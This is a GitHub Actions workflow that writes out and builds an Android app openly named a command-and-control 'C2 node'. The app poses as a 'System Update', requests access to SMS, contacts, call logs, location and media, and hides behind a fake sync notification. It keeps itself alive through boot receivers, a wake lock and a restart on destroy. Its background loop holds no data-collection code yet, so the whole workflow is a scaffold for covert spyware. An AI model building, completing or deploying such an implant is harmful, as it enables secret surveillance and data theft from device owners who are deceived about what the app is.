name: Absolute Black C2 Android Node Builder

on:
  workflow_dispatch:

jobs:
  build:
    name: Build Operational C2 APK
    runs-on: ubuntu-latest

    steps:
      - name: Checkout Repository Code
        uses: actions/checkout@v4

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          distribution: 'temurin'
          java-version: '17'

      - name: Setup Gradle (Version 8.5)
        uses: gradle/actions/setup-gradle@v3
        with:
          gradle-version: '8.5'

      - name: Scaffold Complete C2 Android Architecture
        run: |
          echo "إشاء هيكل العقدة السيبرانية بدون أخطاء الموارد والـ Manifest..."
          mkdir -p app/src/main/java/com/abod/app app/src/main/res/values app/src/main/assets
          
          # 1. AndroidManifest.xml (بدون package attribute وبأيقونة آمنة)
          cat << 'EOF' > app/src/main/AndroidManifest.xml
          <manifest xmlns:android="http://schemas.android.com/apk/res/android"
              xmlns:tools="http://schemas.android.com/tools">

              <uses-permission android:name="android.permission.INTERNET" />
              <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
              <uses-permission android:name="android.permission.WAKE_LOCK" />
              <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
              <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
              <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
              <uses-permission android:name="android.permission.READ_SMS" />
              <uses-permission android:name="android.permission.READ_CONTACTS" />
              <uses-permission android:name="android.permission.READ_CALL_LOG" />
              <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
              <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
              <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" android:maxSdkVersion="32" />
              <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
              <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />

              <application
                  android:allowBackup="true"
                  android:icon="@android:drawable/ic_menu_compass"
                  android:label="System Update"
                  android:roundIcon="@android:drawable/ic_menu_compass"
                  android:supportsRtl="true"
                  android:theme="@style/Theme.AppCompat.Light.NoActionBar">

                  <activity
                      android:name=".MainActivity"
                      android:exported="true"
                      android:theme="@style/Theme.AppCompat.Light.NoActionBar">
                      <intent-filter>
                          <action android:name="android.intent.action.MAIN" />
                          <category android:name="android.intent.category.LAUNCHER" />
                      </intent-filter>
                  </activity>

                  <service
                      android:name=".SyncService"
                      android:enabled="true"
                      android:exported="false"
                      android:foregroundServiceType="dataSync" />

                  <receiver
                      android:name=".BootReceiver"
                      android:enabled="true"
                      android:exported="true"
                      android:directBootAware="true">
                      <intent-filter>
                          <action android:name="android.intent.action.BOOT_COMPLETED" />
                          <action android:name="android.intent.action.QUICKBOOT_POWERON" />
                          <action android:name="android.intent.action.REBOOT" />
                      </intent-filter>
                  </receiver>

              </application>
          </manifest>
          EOF

          # 2. MainActivity.kt
          cat << 'EOF' > app/src/main/java/com/abod/app/MainActivity.kt
          package com.abod.app

          import android.content.Intent
          import android.os.Bundle
          import androidx.appcompat.app.AppCompatActivity

          class MainActivity : AppCompatActivity() {
              override fun onCreate(savedInstanceState: Bundle?) {
                  super.onCreate(savedInstanceState)
                  val serviceIntent = Intent(this, SyncService::class.java)
                  startForegroundService(serviceIntent)
                  finish()
              }
          }
          EOF

          # 3. SyncService.kt
          cat << 'EOF' > app/src/main/java/com/abod/app/SyncService.kt
          package com.abod.app

          import android.app.Notification
          import android.app.NotificationChannel
          import android.app.NotificationManager
          import android.app.Service
          import android.content.Context
          import android.content.Intent
          import android.os.IBinder
          import android.os.PowerManager
          import androidx.core.app.NotificationCompat
          import kotlinx.coroutines.*

          class SyncService : Service() {
              private var wakeLock: PowerManager.WakeLock? = null
              private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())

              override fun onCreate() {
                  super.onCreate()
                  val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
                  wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "AbodC2::SyncLock")
                  wakeLock?.acquire(10*60*60*1000L)
                  startForegroundServiceNotification()
              }

              private fun startForegroundServiceNotification() {
                  val channelId = "c2_sync_channel"
                  val channel = NotificationChannel(channelId, "System Sync Service", NotificationManager.IMPORTANCE_LOW)
                  val manager = getSystemService(NotificationManager::class.java)
                  manager?.createNotificationChannel(channel)

                  val notification: Notification = NotificationCompat.Builder(this, channelId)
                      .setContentTitle("System Synchronization")
                      .setContentText("Running background sync...")
                      .setSmallIcon(android.R.drawable.stat_sys_upload)
                      .build()

                  startForeground(1, notification)
              }

              override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
                  serviceScope.launch {
                      while (isActive) {
                          try {
                              delay(30000L)
                          } catch (e: Exception) {
                              delay(10000L)
                          }
                      }
                  }
                  return START_STICKY
              }

              override fun onDestroy() {
                  super.onDestroy()
                  wakeLock?.release()
                  serviceScope.cancel()
                  val broadcastIntent = Intent(this, BootReceiver::class.java)
                  sendBroadcast(broadcastIntent)
              }

              override fun onBind(intent: Intent?): IBinder? = null
          }
          EOF

          # 4. BootReceiver.kt
          cat << 'EOF' > app/src/main/java/com/abod/app/BootReceiver.kt
          package com.abod.app

          import android.content.BroadcastReceiver
          import android.content.Context
          import android.content.Intent
          import android.os.Build

          class BootReceiver : BroadcastReceiver() {
              override fun onReceive(context: Context, intent: Intent) {
                  val serviceIntent = Intent(context, SyncService::class.java)
                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                      context.startForegroundService(serviceIntent)
                  } else {
                      context.startService(serviceIntent)
                  }
              }
          }
          EOF

          # 5. app/build.gradle
          cat << 'EOF' > app/build.gradle
          plugins {
              id 'com.android.application'
              id 'org.jetbrains.kotlin.android'
          }
          android {
              compileSdk 34
              namespace 'com.abod.app'
              defaultConfig {
                  applicationId "com.abod.app"
                  minSdk 26
                  targetSdk 34
                  versionCode 1
                  versionName "1.0"
              }
              buildTypes {
                  release {
                      minifyEnabled false
                  }
              }
              compileOptions {
                  sourceCompatibility JavaVersion.VERSION_17
                  targetCompatibility JavaVersion.VERSION_17
              }
              kotlinOptions {
                  jvmTarget = '17'
              }
          }
          dependencies {
              implementation 'androidx.core:core-ktx:1.12.0'
              implementation 'androidx.appcompat:appcompat:1.6.1'
              implementation 'androidx.work:work-runtime-ktx:2.9.0'
              implementation 'org.jetbrains.kotlinx:kotlinx-coroutines-android:1.7.3'
          }
          EOF

          # 6. build.gradle (Root)
          cat << 'EOF' > build.gradle
          plugins {
              id 'com.android.application' version '8.1.1' apply false
              id 'org.jetbrains.kotlin.android' version '1.9.0' apply false
          }
          EOF

          # 7. settings.gradle
          cat << 'EOF' > settings.gradle
          pluginManagement {
              repositories {
                  google()
                  mavenCentral()
                  gradlePluginPortal()
              }
          }
          dependencyResolutionManagement {
              repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)
              repositories {
                  google()
                  mavenCentral()
              }
          }
          rootProject.name = "AbodC2Node"
          include ':app'
          EOF

          # 8. gradle.properties
          cat << 'EOF' > gradle.properties
          android.useAndroidX=true
          android.enableJetifier=true
          org.gradle.jvmargs=-Xmx2048m -Dfile.encoding=UTF-8
          EOF

      - name: Build Operational C2 APK Debug
        run: gradle app:assembleDebug

      - name: Upload C2 APK Artifact
        uses: actions/upload-artifact@v4
        with:
          name: Absolute-Black-C2-Node
          path: app/build/outputs/apk/debug/app-debug.apk
